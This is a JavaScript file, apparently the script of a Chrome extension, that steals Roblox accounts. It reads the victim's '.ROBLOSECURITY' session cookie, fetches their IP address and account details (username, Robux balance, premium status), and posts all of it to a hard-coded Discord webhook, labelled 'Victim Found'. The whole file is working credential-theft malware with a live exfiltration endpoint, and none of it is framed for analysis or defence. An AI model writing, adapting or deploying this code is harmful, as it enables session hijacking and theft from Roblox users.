const WEBHOOK = "https://discord.com/api/webhooks/1322567795820466326/3PF0HjpJ9VVuJNW7kXHnRXx_tJMBlWUp_nTQ1qKeEM3ipeYfc6fTdnmnC_pNC5c2rOgL";

let lastUsername = null; // To track the previously detected username

async function sendWebhook(username, statistics, cookie, ipAddr) {
    try {
        const robuxBalance = statistics?.RobuxBalance?.toString() || "N/A";
        const isPremium = statistics?.IsPremium ? "Yes" : "No";
        const avatarUrl = statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";

        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        description: "```" + (cookie || "COOKIE NOT FOUND") + "```",
                        color: 3447003, // Blue color
                        fields: [
                            {
                                name: "Username",
                                value: username || "N/A",
                                inline: true
                            },
                            {
                                name: "Robux",
                                value: robuxBalance,
                                inline: true
                            },
                            {
                                name: "Premium",
                                value: isPremium,
                                inline: true
                            }
                        ],
                        author: {
                            name: "Victim Found: " + ipAddr,
                            icon_url: avatarUrl
                        },
                        footer: {
                            text: "https://github.com/ox-y",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                        },
                        thumbnail: {
                            url: avatarUrl
                        }
                    }
                ],
                username: "Roblox",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                attachments: []
            })
        });
        console.log("Webhook sent successfully.");
    } catch (error) {
        console.error("Failed to send webhook:", error);
    }
}

async function main(cookie) {
    try {
        const ipResponse = await fetch("https://api.ipify.org");
        const ipAddr = await ipResponse.text();

        if (!cookie) {
            console.warn("No cookie found!");
            return;
        }

        const userResponse = await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`
            },
            redirect: "manual"
        });

        if (!userResponse.ok) {
            console.error("Failed to fetch Roblox user information.");
            return;
        }

        const statistics = await userResponse.json();

        // Extract relevant information
        const currentUsername = statistics?.UserName || "N/A";
        const robuxBalance = statistics?.RobuxBalance || "N/A";
        const isPremium = statistics?.IsPremium ? "Yes" : "No";

        console.log(`Username: ${currentUsername}, Robux: ${robuxBalance}, Premium: ${isPremium}`);

        if (currentUsername !== lastUsername) {
            console.log(`New username detected: ${currentUsername}`);
            await sendWebhook(currentUsername, statistics, cookie, ipAddr);
            lastUsername = currentUsername; // Update the last username
        } else {
            console.log(`No change in username. Current: ${currentUsername}`);
        }
    } catch (error) {
        console.error("An error occurred:", error);
    }
}

// Ensure Chrome extension permissions include "cookies" and the Roblox domain
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
    main(cookie?.value || null);
});
